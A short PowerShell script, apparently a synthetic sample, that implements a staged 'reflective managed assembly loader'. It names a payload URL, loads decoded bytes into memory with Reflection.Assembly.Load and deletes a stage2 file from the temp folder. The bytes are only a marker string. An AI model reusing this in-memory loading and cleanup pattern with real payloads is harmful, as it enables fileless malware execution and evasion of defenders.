<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
$FetchUrl = "https://contoso.com/payload.bin"
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo5eGp4NHQ5cjJj')
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$StageResult = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $StageResult) {
    Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
